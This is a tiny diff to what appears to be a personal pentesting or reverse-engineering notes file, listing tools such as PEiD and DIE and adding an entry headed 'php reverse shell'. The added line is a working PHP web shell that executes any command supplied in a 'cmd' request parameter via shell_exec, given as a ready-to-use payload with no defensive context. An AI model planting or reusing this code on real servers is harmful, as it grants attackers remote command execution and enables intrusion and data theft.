@@ -281,3 +281,8 @@ Entry point
 
 peid tool
 die.exe tool
+
+
+php reverse shell
+
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; 
